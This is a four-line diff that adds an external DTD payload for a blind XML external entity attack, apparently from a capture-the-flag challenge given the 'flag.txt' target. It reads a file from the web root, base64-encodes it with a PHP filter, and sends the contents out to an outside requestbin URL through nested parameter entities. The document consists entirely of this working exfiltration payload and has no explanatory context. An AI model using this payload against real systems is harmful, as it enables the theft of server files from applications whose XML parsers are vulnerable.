@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/phantom/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://requestbin.whapi.cloud/167yya51?data=%file;'>">
+%eval;
+%exfiltrate;
